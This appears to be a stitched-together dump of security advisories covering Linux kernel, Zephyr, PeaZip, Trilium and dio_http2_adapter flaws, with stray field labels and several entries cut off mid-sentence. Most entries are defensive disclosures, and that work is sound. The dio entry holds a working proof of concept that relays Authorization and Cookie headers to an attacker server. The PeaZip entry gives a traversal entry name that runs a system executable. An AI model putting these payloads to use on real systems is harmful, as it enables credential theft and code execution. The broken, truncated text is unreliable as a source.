fastopenq.qlen is charged in tcp_fastopen_create_child() when the child
is created and uncharged in reqsk_fastopen_remove() when the handshake
completes.  The uncharge follows rsk_listener of the request the child
points at, and inet_reqsk_clone() has repointed the child at a new
request owned by the new listener, so the ++ and the -- land on two
different sockets.  The new listener's qlen drifts negative and its
limit no longer binds.

Charge the new listener during migration, like reqsk_queue_migrated()
already does for queue->young and queue->qlen.

In the Linux kernel, the following vulnerability has been resolved:

net/smc: fix TOCTOU race between smc_listen_out() and listener close

smc_listen_out() reads lsmc->sk.sk_state without the listener lock,
then acquires lock_sock_nested() only after the check passes. This
opens a window where smc_close_active() can transition the listener
to SMC_CLOSED, call smc_close_cleanup_listen() to drain the accept
queue, and release the lock, all between the lockless read and the
delayed lock acquisition:

  smc_listen_work (smc_hs_wq)          smc_close_active()
  -------------------------------      -------------------------
  release_sock(child)
  if (sk_state == SMC_LISTEN) TRUE
                                        lock_sock(listener)
                                        sk_state = SMC_CLOSED
                                        smc_close_cleanup_listen()
                                        release_sock(listener)
                                        flush_work(tcp_listen_work)
  lock_sock_nested(listener)
  smc_accept_enqueue(listener, child) /* child enqueued on dead listener */

smc_close_active() flushes only tcp_listen_work. Work items already
dispatched onto smc_hs_wq for the CLC handshake continue running
unguarded. smc_accept_enqueue() takes a sock_hold() on the child that
is never released, so the child smc_sock, its clcsock, and the
reference all leak. A remote peer that opens TCP connections while the
server calls close() can exhaust kernel memory.

Move lock_sock_nested() to before the sk_state check so that the test
and the enqueue are atomic under the listener lock.

In the Linux kernel, the following vulnerability has been resolved:

net: usb: ax88179_178a: fix skb leak in ax88179_tx_fixup()

When the interface has NETIF_F_SG enabled and skb_linearize() fails in
ax88179_tx_fixup(), the function returns NULL without freeing the skb.

usbnet_start_xmit() treats a NULL return from tx_fixup() as a drop
(info->flags does not set FLAG_MULTI_PACKET for this driver), jumping
to the "drop" label where it does `if (skb) dev_kfree_skb_any(skb)`.
Because tx_fixup() returned NULL, the local skb variable in
usbnet_start_xmit() is NULL, so the original skb is never freed — a
memory leak on every TX frame whose linearization fails (i.e. under
memory pressure).

Free the skb before returning, matching the error handling already used
for the pskb_expand_head() failure path in the same function.

In the Linux kernel, the following vulnerability has been resolved:

NTB: ntb_netdev: Preserve RX queue depth on allocation failure

ntb_netdev_rx_handler() hands the received skb to the network stack
before allocating its replacement. If the allocation fails, nothing is
reposted. Every failure therefore takes one buffer out of the RX queue
while the interface remains up, and enough failures eventually stall
reception.

A retry path could refill the queue later, but ntb_netdev has none.
Allocate the replacement first instead. If that fails, drop the packet
and repost the same skb. This keeps the queue full and lets packet
delivery resume as soon as memory is available again.

netfilter: bridge: release template ct on non-IP path

A bridge nftables ct zone set rule can attach a conntrack template to
an skb before nf_ct_bridge_pre() sees it. For non-IPv4 and non-IPv6
EtherTypes, nf_ct_bridge_pre() currently overwrites skb->_nfct with

In the Linux kernel, the following vulnerability has been resolved:

netfilter: nf_conntrack: defer invalid log until after unlock

TCP and SCTP conntrack paths can emit invalid-packet logs while ct->lock
is still held.

When invalid logging is routed to nfnetlink_log and conntrack export is
enabled, the log path can re-enter conntrack netlink glue and dump the
same conntrack again. Protocol attribute dumping may take ct->lock, so
logging while holding that lock can deadlock.

Defer the TCP invalid logs by storing only the minimal log context while
ct->lock is held and emitting the log after unlocking. Also make the TCP
timeout-lowering invalid path return whether a log is needed, then emit
that log after unlocking.

Do the same for the SCTP invalid state-transition log that can be reached
while ct->lock is held.

Add a lockdep assertion to nf_ct_l4proto_log_invalid() so future callers
that log invalid conntracks while holding ct->lock are caught outside TCP
and SCTP as well.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

ipv6: fix Route Information option length validation

rt6_route_rcv() validates the Route Information option (RFC 4191) length
against the prefix length, but both checks are off by one.

rinfo->length is the ND option length in units of 8 octets and it
*includes* the 8-byte option header, so an option carrying N bytes of
prefix has length == 1 + N/8.  RFC 4191 section 2.3 requires length 3
when Prefix Length is greater than 64, and 2 or 3 when it is greater
than 0.  The code accepts length >= 2 and length >= 1 respectively.

ipv6_addr_prefix() then copies prefix_len/8 bytes out of rinfo->prefix,
so a Router Advertisement with (prefix_len=128, length=2) or
(prefix_len=64, length=1) makes the kernel read up to 8 bytes past the
end of the option.  Those bytes end up in the prefix of the route that
gets installed, so they are visible to userspace:

  # RA with a Route Information option (prefix_len=128, length=2)
  # followed by a source link-layer address option, 01 01 de ad be ef ca fe
  $ ip -6 route show
  2001:db8:dead:beef:101:dead:beef:cafe via fe80::1234 dev veth0 proto ra
                     ^^^^^^^^^^^^^^^^^^ the next option, read out of bounds

When the Route Information option is the last one in the packet, those
eight bytes come from the skb tail room instead.

Reject the option lengths RFC 4191 does not allow.

xdp_master_redirect() dereferences the result of

In the Linux kernel, the following vulnerability has been resolved:

ptrace: slightly saner 'get_dumpable()' logic

The 'dumpability' of a task is fundamentally about the memory image of
the task - the concept comes from whether it can core dump or not - and
makes no sense when you don't have an associated mm.

And almost all users do in fact use it only for the case where the task
has a mm pointer.

But we have one odd special case: ptrace_may_access() uses 'dumpable' to
check various other things entirely independently of the MM (typically
explicitly using flags like PTRACE_MODE_READ_FSCREDS).  Including for
threads that no longer have a VM (and maybe never did, like most kernel
threads).

It's not what this flag was designed for, but it is what it is.

The ptrace code does check that the uid/gid matches, so you do have to
be uid-0 to see kernel thread details, but this means that the
traditional "drop capabilities" model doesn't make any difference for
this all.

Make it all make a *bit* more sense by saying that if you don't have a
MM pointer, we'll use a cached "last dumpability" flag if the thread
ever had a MM (it will be zero for kernel threads since it is never
set), and require a proper CAP_SYS_PTRACE capability to override.

In Zephyr's kernel pipe implementation, the userspace syscall verifier z_vrfy_k_pipe_init() in kernel/pipe.c used K_SYSCALL_OBJ() (which requires the kernel object to already be initialized) instead of K_SYSCALL_OBJ_NEVER_INIT() (which rejects an already-initialized object). As a result, on CONFIG_USERSPACE builds an unprivileged user thread that has been granted access to a k_pipe object can invoke the k_pipe_init syscall to re-initialize a pipe that is already in use.

z_impl_k_pipe_init() unconditionally resets the ring buffer, sets pipe->waiting to 0, and re-initializes both wait queues (z_waitq_init on pipe->data and pipe->space) without waking or accounting for threads currently blocked on the pipe. Any thread already pended in k_pipe_read()/k_pipe_write() is left orphaned: still marked pending with pended_on pointing at the cleared wait queue and with stale qnode_dlist links into the (now re-initialized) embedded list head.

When such an orphaned waiter is later timed out or woken, the scheduler calls sys_dlist_remove() on its stale node, writing through dangling prev/next pointers into kernel wait-queue/scheduler structures, causing list corruption (an attacker-driven invalid kernel write), lost wakeups, indefinitely blocked threads, and silent data loss. The flaw lets a deprivileged user thread corrupt the state of a kernel object shared with other threads/partitions.

The fix switches the verifier to K_SYSCALL_OBJ_NEVER_INIT(), matching the existing k_msgq_init verifier, so a user thread can no longer re-initialize a live pipe. The vulnerable code shipped in v4.1.0 and remained through v4.4.0.

items.summary: bt_sdp_parse_attribute() in subsys/bluetooth/host/classic/sdp.c validated only that the SDP record buffer held the type-marker byte plus the 2-byte attribute ID (a check of buf->len < 3) but then read a fourth byte, the data-element descriptor (type), via net_buf_simple_pull_u8(). Because net_buf_simple_pull_u8() dereferences buf->data[0] before its only bounds guard (an __ASSERT_NO_MSG that compiles out when CONFIG_ASSERT is disabled, the production default), a record of exactly three bytes (0x09 followed by a 2-byte attribute ID) causes a one-byte read past the end of the logical buffer. The parser is reachable from inbound, remote-controlled data: a Bluetooth BR/EDR peer acting as an SDP server returns discovery-response records that are stored verbatim in the client receive buffer and parsed via the public bt_sdp_get_attr()/bt_sdp_has_attr()/bt_sdp_record_parse() helpers. The over-read is bounded to a single byte that is used only as an internal length selector and is never leaked to the attacker; subsequent length checks then reject the malformed record. Realistic impact is therefore limited to an edge-case denial of service (a fault only if the record ends exactly at a mapped-memory boundary, or a deterministic assert panic when CONFIG_ASSERT=y). Affects Zephyr v4.3.0 and v4.4.0; fixed by adding sizeof(type) to the length check.

items.summary: Path Traversal (CWE-22) in the execute_obj function of the archive object viewer (peach.pas) in PeaZip 11.2.0 and earlier on Windows allows an attacker who convinces a victim to preview an entry of a crafted archive via the "Preview with... -> Associated application" action (Shift+Ctrl+O) to execute an arbitrary program already present on the victim's system, with no warning dialog. The function validates only outname (PeaZip's own temporary directory) with checkfiledirname, while the string actually executed is the concatenation outname+tempstring; tempstring is taken verbatim from the archive entry name (StringGridList.Cells[12,...]) and is never validated. checkfiledirname (list_utils.pas) rejects control and reserved characters in the file name but performs no ".." path-containment check, so an entry named ../../../../Windows/System32/calc.exe escapes the extraction directory and is passed to cp_open -> ShellExecuteW; the extracting backend (7-Zip) strips the traversal while the opener does not. In addition, the SECEXTCONST dangerous-extension confirmation prompt is implemented only in the double-click handler (grid_obj_open) and not on this preview route, so an executable inside an archive reaches ShellExecuteW unannounced, and where the prompt does fire it names the entry's display name rather than the resolved path that will run. Arbitrary code execution was demonstrated with a proof of concept against official PeaZip builds, confirmed on two archive formats (.zip and .tar) to show the defect is in PeaZip's own path handling and not in a single format parser.

items.summary:
### Summary

`dio_http2_adapter` follows HTTP `Location` redirects without stripping sensitive request headers when the redirect target is a different origin. An attacker who can cause any origin server to return a cross-origin `302` redirect receives the victim's `Authorization`, `Cookie`, and `Proxy-Authorization` headers verbatim. This vulnerability has a CVSS v3.1 base score of **7.5 (High)** because `followRedirects` is enabled by default, no authentication is required to exploit it, and the confidentiality impact is high.

### Details

When `Dio` is configured to use `Http2Adapter`, the adapter's internal `_fetch` method constructs HTTP/2 request headers by unconditionally copying all entries from `options.headers`:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:111
headers.addAll(
  options.headers.entries.map((entry) {
    ...
    return Header.ascii(entry.key.toLowerCase(), v);
  }).toList(),
);
```

On receiving a `3xx` response, the adapter reads the `Location` header and resolves the redirect target URI:

```dart
// plugins/http2_adapter/lib/src/http2_adapter.dart:254-263
final url = responseHeaders.value('location');
final uri = Uri.parse(url ?? '');
final String path = resolveRedirectUri(options.uri, uri).toString();
return _fetch(options.copyWith(path: path, maxRedirects: --options.maxRedirects), ...);
```

`options.copyWith` is called without an explicit `headers` argument; `dio/lib/src/options.dart:629` therefore preserves the full original header map via `headers ?? Map.from(this.headers)`. `resolveRedirectUri` (`http2_adapter.dart:290`) returns an attacker-controlled cross-origin URI without any origin comparison. The combination means that on every redirect, the full set of original sensitive headers — including `Authorization`, `Cookie`, and `Proxy-Authorization` — is forwarded to the new authority with no sanitization.

**Data flow (source → sink):**

1. `dio/lib/src/dio_mixin.dart:383` — public `Dio.request<T>(String path, ...)` entry point.
2. `dio/lib/src/options.dart:331` — base and per-request headers merged into `RequestOptions`.
3. `dio/lib/src/dio_mixin.dart:596` — `httpClientAdapter.fetch(reqOpt, ...)` dispatches to `Http2Adapter`.
4. `plugins/http2_adapter/lib/src/http2_adapter.dart:254` — `Location` header is read from the network response (attacker-controlled source).
5. `plugins/http2_adapter/lib/src/http2_adapter.dart:258` — redirect target URI resolved; cross-origin check absent.
6. `plugins/http2_adapter/lib/src/http2_adapter.dart:260` — `options.copyWith(path: path, ...)` called without `headers` override.
7. `dio/lib/src/options.dart:629` — `copyWith` preserves `Map.from(this.headers)` — all sensitive headers retained.
8. `plugins/http2_adapter/lib/src/http2_adapter.dart:111` — preserved headers emitted verbatim to the cross-origin HTTP/2 request (sink).

**Suggested patch** — strip sensitive headers before following a cross-origin redirect:

```diff
--- a/plugins/http2_adapter/lib/src/http2_adapter.dart
+++ b/plugins/http2_adapter/lib/src/http2_adapter.dart
+  static const _sensitiveRedirectHeaders = {
+    'authorization',
+    'cookie',
+    'proxy-authorization',
+  };
+
-      final String path = resolveRedirectUri(options.uri, uri).toString();
+      final redirectUri = resolveRedirectUri(options.uri, uri);
+      final redirectOptions = options.copyWith(
+        path: redirectUri.toString(),
+        maxRedirects: --options.maxRedirects,
+      );
+      if (!_sameOrigin(options.uri, redirectUri)) {
+        redirectOptions.headers.removeWhere(
+          (name, _) => _sensitiveRedirectHeaders.contains(name.toLowerCase()),
+        );
+      }
       return _fetch(
-        options.copyWith(path: path, maxRedirects: --options.maxRedirects),
+        redirectOptions,
         list != null ? Stream.fromIterable(list) : null,
         cancelFuture,
         redirects,
       );
+
+  static bool _sameOrigin(Uri a, Uri b) =>
+      a.scheme == b.scheme && a.host == b.host && a.port == b.port;
```

### PoC

The following steps reproduce the vulnerability using two local HTTP/2 cleartext (h2c) servers inside an isolated Docker container (no external network required).

**Prerequisites:**

- Docker installed and accessible.
- Repository checked out at the path used as the build context.

**Build and run:**

```bash
# From the repository root (github_web_81_cfug__dio/)
docker build -f vuln-001/Dockerfile -t dio-vuln-001:poc .
docker run --rm --network none dio-vuln-001:poc
```

**What the container does:**

1. Starts an *origin* h2c server on `127.0.0.1:18081` that immediately returns `302 Location: http://127.0.0.1:18082/capture`.
2. Starts an *attacker* h2c server on `127.0.0.1:18082` that logs every received header.
3. Executes the following Dart exploit:

```dart
final dio = Dio()
  ..httpClientAdapter = Http2Adapter(ConnectionManager());
await dio.get(
  'http://127.0.0.1:18081/start',
  options: Options(headers: {
    'Authorization': 'Bearer SECRET_TOKEN_12345',
    'Cookie': 'sid=SECRET_SESSION_ABC',
    'x-secret': 'internal-secret-value',
  }),
);
```

**Expected output (confirms vulnerability):**

```
RESULT=VULN_CONFIRMED
LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345
LEAKED_COOKIE=sid=SECRET_SESSION_ABC

[ATTACKER] Received headers:
[ATTACKER]   authorization: Bearer SECRET_TOKEN_12345
[ATTACKER]   cookie: sid=SECRET_SESSION_ABC
[ATTACKER]   x-secret: internal-secret-value
```

The attacker server at `127.0.0.1:18082` receives all three sensitive headers, demonstrating that `Http2Adapter` forwards them verbatim across the cross-origin redirect with no stripping.

### Impact

This is a **sensitive information disclosure** vulnerability. Any application that:

1. configures `Dio` with `Http2Adapter`, and
2. sends requests carrying `Authorization`, `Cookie`, or `Proxy-Authorization` headers,

is affected. Because `followRedirects` defaults to `true` and `maxRedirects` defaults to `5`, no additional configuration is needed to trigger the bug.

An attacker who controls — or can compromise — any HTTP server that the victim application contacts can issue a `302` redirect to an attacker-owned server and thereby capture the victim's bearer tokens, session cookies, or proxy credentials. The attack requires no prior authentication and is executable over the network with low complexity. Stolen credentials may then be used to impersonate the victim against the original service or any other service that accepts the same token.

Affected parties include server-side Dart/Flutter applications and CLI tools that make authenticated HTTP/2 requests through `dio_http2_adapter`.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# Dockerfile for VULN-001 dynamic reproduction
# Vulnerability: Cross-origin redirect leaks sensitive request headers in dio_http2_adapter
#
# Build context: the parent directory (github_web_81_cfug__dio/)
#   docker build -f vuln-001/Dockerfile -t dio-vuln-001 .
#
# What this image does:
#   1. Installs Dart SDK (stable)
#   2. Copies the vulnerable repository source (dio + dio_http2_adapter)
#   3. Creates a PoC Dart project using path dependencies to the local source
#   4. Resolves pub packages
#   5. On container run: executes the exploit script that starts two local
#      h2c servers (origin + attacker) and makes a redirected request to prove
#      that Authorization/Cookie headers are forwarded to the cross-origin target

FROM dart:stable AS builder

# ── Repository source ──────────────────────────────────────────────────────────
# Copy only the packages we need to keep image small
COPY repo/dio/ /repo/dio/
COPY repo/plugins/http2_adapter/ /repo/plugins/http2_adapter/

# ── PoC project setup ──────────────────────────────────────────────────────────
WORKDIR /poc

COPY vuln-001/poc_pubspec.yaml pubspec.yaml
COPY vuln-001/poc_exploit.dart lib/main.dart

# Resolve dependencies (requires network access to pub.dev for http2, meta, etc.)
RUN dart pub get

# ── Runtime image (reuse builder to keep it simple) ────────────────────────────
FROM builder AS final

WORKDIR /poc

# Run the exploit; exit code:
#   0 = VULN_CONFIRMED (authorization header leaked to attacker)
#   1 = NOT_VULNERABLE  (header was stripped or redirect not followed)
#   2 = FAIL            (attacker server never received a request — env issue)
CMD ["dart", "run", "lib/main.dart"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
PoC orchestrator for VULN-001:
  Cross-origin redirect leaks sensitive request headers in dio_http2_adapter.

Usage:
    python3 poc.py [--image-tag TAG]

What it does:
    1. Builds a Docker image containing the vulnerable dio_http2_adapter source
       and a Dart exploit script (poc_exploit.dart).
    2. Runs the container, which:
         a. Starts two local h2c (HTTP/2 cleartext) servers inside the container:
              - Origin  (127.0.0.1:18081): returns 302 → attacker
              - Attacker (127.0.0.1:18082): logs all received headers
         b. Uses dio + Http2Adapter to GET http://origin/start with
            Authorization and Cookie headers.
         c. Follows the 302 redirect to the attacker server.
         d. Reports whether the Authorization header was captured by the attacker.
    3. Writes phase2_result.json with structured verdict.

Exit codes:
    0  PASS   — vulnerability confirmed
    1  FAIL   — not reproduced
    2  ERROR  — build or runtime environment problem
"""

import argparse
import json
import os
import subprocess
import sys
import textwrap
from pathlib import Path

# ── Paths ──────────────────────────────────────────────────────────────────────
SCRIPT_DIR = Path(__file__).resolve().parent
REPO_ROOT = SCRIPT_DIR.parent          # github_web_81_cfug__dio/
RESULT_FILE = SCRIPT_DIR / "phase2_result.json"

BUILD_CONTEXT = str(REPO_ROOT)
DOCKERFILE = str(SCRIPT_DIR / "Dockerfile")
DEFAULT_IMAGE_TAG = "dio-vuln-001:poc"


def run(cmd: list[str], **kwargs) -> subprocess.CompletedProcess:
    """Run a subprocess command, streaming stdout/stderr to the terminal."""
    print(f"[+] {' '.join(cmd)}", flush=True)
    return subprocess.run(cmd, **kwargs)


def build_image(tag: str) -> bool:
    """Build the Docker image. Returns True on success."""
    result = run(
        [
            "docker", "build",
            "--file", DOCKERFILE,
            "--tag", tag,
            BUILD_CONTEXT,
        ],
        check=False,
    )
    if result.returncode != 0:
        print(f"[!] Docker build failed (exit {result.returncode})", file=sys.stderr)
        return False
    return True


def run_container(tag: str, timeout_sec: int = 120) -> tuple[int, str, str]:
    """
    Run the container and capture its output.

    Returns:
        (returncode, stdout, stderr)
    """
    result = run(
        [
            "docker", "run",
            "--rm",
            "--network", "none",   # no external network; loopback only
            tag,
        ],
        capture_output=True,
        text=True,
        timeout=timeout_sec,
        check=False,
    )
    return result.returncode, result.stdout, result.stderr


def parse_output(stdout: str, stderr: str) -> dict:
    """
    Parse structured key=value lines from the exploit's stdout.

    The Dart exploit writes lines like:
        RESULT=VULN_CONFIRMED
        LEAKED_HEADER=authorization: Bearer SECRET_TOKEN_12345
        EVIDENCE=...
    """
    parsed = {}
    for line in stdout.splitlines():
        if "=" in line:
            key, _, val = line.partition("=")
            parsed[key.strip()] = val.strip()
    return parsed


def write_result(data: dict) -> None:
    with open(RESULT_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    print(f"\n[+] Result written to {RESULT_FILE}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--image-tag", default=DEFAULT_IMAGE_TAG,
        help=f"Docker image tag (default: {DEFAULT_IMAGE_TAG})",
    )
    args = parser.parse_args()
    tag = args.image_tag

    build_cmd = (
        f"docker build -f vuln-001/Dockerfile -t {tag} ."
    )
    run_cmd = (
        f"docker run --rm --network none {tag}"
    )
    poc_cmd = (
        f"cd {REPO_ROOT} && {build_cmd} && {run_cmd}"
    )

    # ── Step 1: Build ──────────────────────────────────────────────────────────
    print("=" * 70)
    print("STEP 1: Building Docker image")
    print("=" * 70)
    if not build_image(tag):
        result_data = {
            "passed": False,
            "verdict": "FAIL",
            "reason": "Docker image build failed — dart pub get or source copy error",
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": "docker build non-zero exit code",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        return 2

    # ── Step 2: Run exploit ────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print("STEP 2: Running exploit container")
    print("=" * 70)

    try:
        returncode, stdout, stderr = run_container(tag)
    except subprocess.TimeoutExpired:
        result_data = {
            "passed": False,
            "verdict": "INCOMPLETE",
            "reason": "Container execution did not complete within 120 seconds and was terminated due to timeout",
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": "subprocess.TimeoutExpired after 120 s",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        return 2

    print("\n── Container STDOUT ─────────────────────────────────────────────")
    print(stdout or "(empty)")
    print("── Container STDERR ─────────────────────────────────────────────")
    print(stderr or "(empty)")
    print("── Exit code:", returncode, "─────────────────────────────────────")

    # ── Step 3: Evaluate results ───────────────────────────────────────────────
    parsed = parse_output(stdout, stderr)
    exploit_result = parsed.get("RESULT", "")
    leaked_header = parsed.get("LEAKED_HEADER", "")
    evidence_line = parsed.get("EVIDENCE", "")

    if returncode == 0 and exploit_result == "VULN_CONFIRMED" and leaked_header:
        # Combine stdout + a snippet of stderr for the evidence field
        stderr_snippet = "\n".join(
            line for line in stderr.splitlines()
            if any(tag in line for tag in ("[ATTACKER]", "[RESULT]", "[EVIDENCE]"))
        )[:1500]
        evidence = (
            f"stdout: {stdout.strip()}\n\n"
            f"stderr (relevant):\n{stderr_snippet}"
        )
        result_data = {
            "passed": True,
            "verdict": "PASS",
            "reason": (
                "dio_http2_adapter forwarded the original Authorization header verbatim "
                "to the attacker's server without stripping it when following a "
                "cross-origin 302 redirect. The attacker h2c server (127.0.0.1:18082) "
                f"received '{leaked_header}'."
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": evidence,
            "artifacts": [
                "Dockerfile",
                "poc_exploit.dart",
                "poc_pubspec.yaml",
                "poc.py",
            ],
        }
        write_result(result_data)
        print("\n[PASS] VULN-001 reproduced successfully.")
        return 0

    elif returncode == 1 or exploit_result == "NOT_VULNERABLE":
        result_data = {
            "passed": False,
            "verdict": "FAIL",
            "reason": (
                "Container execution succeeded, but the attacker server did not "
                "receive the Authorization header. The vulnerability was not "
                f"reproduced in this environment. Parsed result: {parsed}"
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": stdout + "\n" + stderr,
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        print("\n[FAIL] Vulnerability not reproduced.")
        return 1

    else:
        # returncode == 2 or other unexpected failure
        result_data = {
            "passed": False,
            "verdict": "INCOMPLETE",
            "reason": (
                f"Container execution failed or exited with an unexpected code {returncode}. "
                "Cause: h2c server startup error, network issue, or Dart runtime "
                "error. Check the stderr log and retry without --network none."
            ),
            "build_command": f"cd {REPO_ROOT} && {build_cmd}",
            "run_command": run_cmd,
            "poc_command": poc_cmd,
            "evidence": f"exit={returncode}\nstdout={stdout}\nstderr={stderr}",
            "artifacts": ["Dockerfile", "poc_exploit.dart", "poc_pubspec.yaml"],
        }
        write_result(result_data)
        print(f"\n[INCOMPLETE] Container exited with code {returncode}.")
        return 2


if __name__ == "__main__":
    sys.exit(main())
```

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

virtio-net: fix received length check in big packets

Since commit 4959aebba8c0 ("virtio-net: use mtu size as buffer length
for big packets"), when guest gso is off, the allocated size for big
packets is not MAX_SKB_FRAGS * PAGE_SIZE anymore but depends on
negotiated MTU. The number of allocated frags for big packets is stored
in vi->big_packets_num_skbfrags.

Because the host announced buffer length can be malicious (e.g. the host
vhost_net driver's get_rx_bufs is modified to announce incorrect
length), we need a check in virtio_net receive path. Currently, the
check is not adapted to the new change which can lead to NULL page
pointer dereference in the below while loop when receiving length that
is larger than the allocated one.

This commit fixes the received length check corresponding to the new
change.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

bus: mhi: host: Detect events pointing to unexpected TREs

When a remote device sends a completion event to the host, it contains a
pointer to the consumed TRE. The host uses this pointer to process all of
the TREs between it and the host's local copy of the ring's read pointer.
This works when processing completion for chained transactions, but can
lead to nasty results if the device sends an event for a single-element
transaction with a read pointer that is multiple elements ahead of the
host's read pointer.

For instance, if the host accesses an event ring while the device is
updating it, the pointer inside of the event might still point to an old
TRE. If the host uses the channel's xfer_cb() to directly free the buffer
pointed to by the TRE, the buffer will be double-freed.

This behavior was observed on an ep that used upstream EP stack without
'commit 6f18d174b73d ("bus: mhi: ep: Update read pointer only after buffer
is written")'. Where the device updated the events ring pointer before
updating the event contents, so it left a window where the host was able to
access the stale data the event pointed to, before the device had the
chance to update them. The usual pattern was that the host received an
event pointing to a TRE that is not immediately after the last processed
one, so it got treated as if it was a chained transaction, processing all
of the TREs in between the two read pointers.

This commit aims to harden the host by ensuring transactions where the
event points to a TRE that isn't local_rp + 1 are chained.

In the Linux kernel, the following vulnerability has been resolved:

vsock/virtio: Validate length in packet header before skb_put()

When receiving a vsock packet in the guest, only the virtqueue buffer
size is validated prior to virtio_vsock_skb_rx_put(). Unfortunately,
virtio_vsock_skb_rx_put() uses the length from the packet header as the
length argument to skb_put(), potentially resulting in SKB overflow if
the host has gone wonky.

Validate the length as advertised by the packet header before calling
virtio_vsock_skb_rx_put().

In the Linux kernel, the following vulnerability has been resolved:

bonding: alb: re-check primary_is_promisc under RTNL in bond_alb_monitor

bond_alb_monitor() reads primary_is_promisc under RCU, then drops RCU and
takes RTNL via rtnl_trylock() before undoing the promiscuity it set on the
active slave. In that window the active slave can change under RTNL
(RTM_DELLINK -> __bond_release_one() -> bond_alb_handle_active_change()),
which already drops the promiscuity and clears primary_is_promisc. The
monitor still acts on the stale decision: if the slave was removed with no
failover, curr_active_slave is now NULL and the deref faults; if it failed
over, the stale dev_set_promiscuity(-1) underflows the new slave's
promiscuity counter and pins it in IFF_PROMISC.

  Oops: general protection fault, probably for non-canonical address ...
  KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
  Workqueue: b42 bond_alb_monitor
  RIP: 0010:bond_alb_monitor (drivers/net/bonding/bond_alb.c:1600)
   process_one_work (kernel/workqueue.c:3322)
   worker_thread (kernel/workqueue.c:3486)
   kthread (kernel/kthread.c:436)
   ret_from_fork (arch/x86/kernel/process.c:158)
  Kernel panic - not syncing: Fatal exception

Re-check primary_is_promisc (and curr_active_slave) after taking RTNL so
the monitor only undoes an increment it still owns. The other bonding
monitors already re-read state under RTNL in their commit phase
(bond_miimon_commit/bond_ab_arp_commit); bond_alb_monitor() was the only
one acting on the pre-trylock decision.

In the Linux kernel, the following vulnerability has been resolved:

wifi: ath5k: do not access array OOB

Vincent reports:
> The ath5k driver seems to do an array-index-out-of-bounds access as
> shown by the UBSAN kernel message:
> UBSAN: array-index-out-of-bounds in drivers/net/wireless/ath/ath5k/base.c:1741:20
> index 4 is out of range for type 'ieee80211_tx_rate [4]'
> ...
> Call Trace:
>  <TASK>
>  dump_stack_lvl+0x5d/0x80
>  ubsan_epilogue+0x5/0x2b
>  __ubsan_handle_out_of_bounds.cold+0x46/0x4b
>  ath5k_tasklet_tx+0x4e0/0x560 [ath5k]
>  tasklet_action_common+0xb5/0x1c0

It is real. 'ts->ts_final_idx' can be 3 on 5212, so:
   info->status.rates[ts->ts_final_idx + 1].idx = -1;
with the array defined as:
   struct ieee80211_tx_rate rates[IEEE80211_TX_MAX_RATES];
while the size is:
   #define IEEE80211_TX_MAX_RATES  4
is indeed bogus.

Set this 'idx = -1' sentinel only if the array index is less than the
array size. As mac80211 will not look at rates beyond the size
(IEEE80211_TX_MAX_RATES).

Note: The effect of the OOB write is negligible. It just overwrites the
next member of info->status, i.e. ack_signal.

In the Linux kernel, the following vulnerability has been resolved:

ksmbd: require minimum ACE size in smb_check_perm_dacl()

Both ACE-walk loops in smb_check_perm_dacl() only guard against an
under-sized remaining buffer, not against an ACE whose declared
`ace->size` is smaller than the struct it claims to describe:

  if (offsetof(struct smb_ace, access_req) > aces_size)
      break;
  ace_size = le16_to_cpu(ace->size);
  if (ace_size > aces_size)
      break;

The first check only requires the 4-byte ACE header to be in bounds;
it does not require access_req (4 bytes at offset 4) to be readable.
An attacker who has set a crafted DACL on a file they own can declare
ace->size == 4 with aces_size == 4, pass both checks, and then

  granted |= le32_to_cpu(ace->access_req);               /* upper loop */
  compare_sids(&sid, &ace->sid);                         /* lower loop */

reads access_req at offset 4 (OOB by up to 4 bytes) and ace->sid at
offset 8 (OOB by up to CIFS_SID_BASE_SIZE + SID_MAX_SUB_AUTHORITIES
* 4 bytes).

Tighten both loops to require

  ace_size >= offsetof(struct smb_ace, sid) + CIFS_SID_BASE_SIZE

which is the smallest valid on-wire ACE layout (4-byte header +
4-byte access_req + 8-byte sid base with zero sub-auths).  Also
reject ACEs whose sid.num_subauth exceeds SID_MAX_SUB_AUTHORITIES
before letting compare_sids() dereference sub_auth[] entries.

parse_sec_desc() already enforces an equivalent check (lines 441-448);
smb_check_perm_dacl() simply grew weaker validation over time.

Reachability: authenticated SMB client with permission to set an ACL
on a file.  On a subsequent CREATE against that file, the kernel
walks the stored DACL via smb_check_perm_dacl() and triggers the
OOB read.  Not pre-auth, and the OOB read is not reflected to the
attacker, but KASAN reports and kernel state corruption are
possible.

items.summary: Trilium is an open-source hierarchical note-taking application. In versions up to and including 0.103.0, the public share-search endpoint does not enforce the per-note shareCredentials and shareHiddenFromTree controls, allowing an unauthenticated visitor to read the titles, tree paths, and content of protected shared notes. The endpoint authorizes only the ancestor note supplied in the request and then runs a full-text search across the entire published subtree, returning each matching note's title, share identifier, and hierarchical path without re-checking whether that individual note requires a share password or is hidden from the navigation tree. Because the search matches note content, an attacker can enumerate protected notes and use the endpoint as a boolean oracle that confirms arbitrary substrings, recovering the full contents of notes that should be gated behind a password. This issue is fixed in version 0.104.0.

